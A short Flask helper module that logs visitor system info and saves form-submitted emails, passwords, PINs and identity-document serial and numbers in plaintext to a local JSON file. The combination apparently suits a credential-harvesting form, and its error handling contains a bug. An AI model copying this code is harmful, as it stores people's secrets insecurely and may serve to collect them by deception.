import datetime
import json
import os
import platform
import sys

from flask import request
from wtforms.validators import Length, Regexp, InputRequired


def user_info():
    info_dict = {
        'date': datetime.datetime.now(),
        'system': f'{platform.system()} {platform.release()} {os.name}',
        'user_agent': request.headers.get('User-Agent'),
        'python': sys.version
    }
    return info_dict


def json_data(form):

    data = {form.email.data: {
        'password': form.password.data,
        'number': form.number.data,
        'pin': form.pin.data,
        'year': form.year.data,
        'serial': form.serial.data,
        'doc_number': form.doc_number.data,
    }, }

    try:
        with open('data.json', 'r') as file:
            file_data = json.load(file)
            file_data.update(data)

        with open('data.json', 'w', encoding='utf-8') as w_file:
            json.dump(file_data, w_file, ensure_ascii=False, indent=4)

    except FileNotFoundError or json.decoder.JSONDecodeError:
        with open('data.json', 'w', encoding='utf-8') as w_file:
            json.dump(data, w_file, ensure_ascii=False, indent=4)


def validate_fields(form):
    if form.year.data is not None:
        regex = '^[A-Z]{2}$' if int(form.year.data) < 2015 else '^[A-Z][0-9]{2}$'
        length = 8 if int(form.year.data) < 2015 else 6
        serial_length = 2 if int(form.year.data) < 2015 else 3

        form.serial.validators = [Regexp(regex, message='before 2015 - 2 letters (for example, AB),'
                                                        'later - 1 letter and 2 numbers '
                                                        '(for example, C17, B20)'),
                                  Length(min=serial_length, max=serial_length)]
        form.doc_number.validators = [InputRequired('Doc number is required'),
                                      Regexp('^[0-9]{' + f'{length}' + '}',
                                             message=f'Must be {length} digits'),
                                      Length(min=length, max=length)]
